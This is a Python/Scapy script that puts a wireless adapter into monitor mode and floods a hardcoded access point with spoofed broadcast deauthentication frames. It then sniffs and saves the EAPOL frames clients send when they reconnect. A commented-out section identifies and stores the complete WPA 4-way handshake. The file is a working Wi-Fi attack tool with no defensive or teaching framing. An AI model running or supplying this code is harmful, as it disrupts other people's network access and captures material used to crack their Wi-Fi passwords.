#!/usr/bin/env python
import sys
from scapy import *
from scapy.all import *
import psutil
from scapy.utils import PcapWriter

pktdump = PcapWriter("banana.pcap", append=True, sync=True)
#interface = sys.argv[1]
eapol_packets = []
handshake_found = 0
# injector = pylorcon.Lorcon(interface, "madwifing")
# injector.setfunctionalmode("INJECT")
# injector.setmode("MONITOR")
# injector.setchannel(11)
destination_addr = 'ff:ff:ff:ff:ff:ff' # i.e. broadcast
bss_id_addr = '9E:29:76:C0:EC:B6'
def deauth(interface):
    dot11 = Dot11(addr1=destination_addr, addr2=bss_id_addr, addr3=bss_id_addr)
    pkt = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(pkt, iface=interface, inter=0.1, count=100, verbose=1)

def sniffEAPOL(p):

    #p.print()
    if(p.haslayer(EAPOL)):
        pktdump.write(p)
        print(p.show)

    # if p.haslayer('WPA_key'):
    #     layer = p.getlayer('WPA_key')
    # if (p.FCfield & 1): 
    #     # Message come from STA 
    #     # From DS = 0, To DS = 1
    #     STA = p.addr2
    # elif (p.FCfield & 2): 
    #     # Message come from AP
    #     # From DS = 1, To DS = 0
    #     STA = p.addr1
    # else:
    #     #   either ad­hoc or WDS
    #     return
    # if (not tracking.has_key (STA)):
    #     fields = {
    #     'frame2': None,
    #     'frame3': None,
    #     'frame4': None,
    #     'replay_counter': None,
    #     'packets': []
    #     }
    #     tracking[STA] = fields
    # key_info = layer.key_info
    # wpa_key_length = layer.wpa_key_length
    # replay_counter = layer.replay_counter
    # WPA_KEY_INFO_INSTALL = 64
    # WPA_KEY_INFO_ACK = 128
    # WPA_KEY_INFO_MIC = 256
    # # check for frame 2
    # if ((key_info & WPA_KEY_INFO_MIC) and 
    # (key_info & WPA_KEY_INFO_ACK == 0) and 
    # (key_info & WPA_KEY_INFO_INSTALL == 0) and 
    # (wpa_key_length > 0)) :
    #     print ("Found packet 2 for ", STA)
    #     tracking[STA]['frame2'] = 1
    #     tracking[STA]['packets'].append (p)
    # # check for frame 3
    # elif ((key_info & WPA_KEY_INFO_MIC) and 
    # (key_info & WPA_KEY_INFO_ACK) and 
    # (key_info & WPA_KEY_INFO_INSTALL)):
    #     print("Found packet 3 for ", STA)
    #     tracking[STA]['frame3'] = 1
    #     # store the replay counter for this STA
    #     tracking[STA]['replay_counter'] = replay_counter
    #     tracking[STA]['packets'].append (p)
    # # check for frame 4
    
    # elif ((key_info & WPA_KEY_INFO_MIC) and 
    # (key_info & WPA_KEY_INFO_ACK == 0) and 
    # (key_info & WPA_KEY_INFO_INSTALL == 0) and
    # tracking[STA]['replay_counter'] == replay_counter):
    #     print("Found packet 4 for ", STA)
    #     tracking[STA]['frame4'] = 1
    #     tracking[STA]['packets'].append (p)
    # if (tracking[STA]['frame2'] and tracking[STA]['frame3'] and
    # tracking[STA]['frame4']):
    #     print("Handshake Found\n\n")
    #     wrpcap ("4way.pcap", tracking[STA]['packets'])
    #     handshake_found = 1
    #     sys.exit(0)


# Changes wireless adapters from managed to monitor
def change_mode(interface):
        os.system(f"ifconfig {interface} down")
        os.system(f"iwconfig {interface} mode monitor")
        os.system(f"ifconfig {interface} up")


# Gets Wireless adapters that aren't the main wifi card.
# Could be an issue as I made the assumption that the first card is the main card
def get_interfaces():
    addresses = psutil.net_if_addrs()
    stats = psutil.net_if_stats()

    wireless_interfaces = []
    for intface, addr_list in addresses.items():
        if  intface[:2] == "wl":
            wireless_interfaces.append(intface)
    return wireless_interfaces


interface = get_interfaces()[1]
print(interface)
change_mode(interface)
tracking = {}
print ("About to deauth\n\n")
deauth(interface)

print ("Deauth done, sniffing for EAPOL traffic")
# reset the tracking between each sniffing attempt
tracking = {}
sniff(iface=interface, prn=sniffEAPOL, count=2000, timeout=30)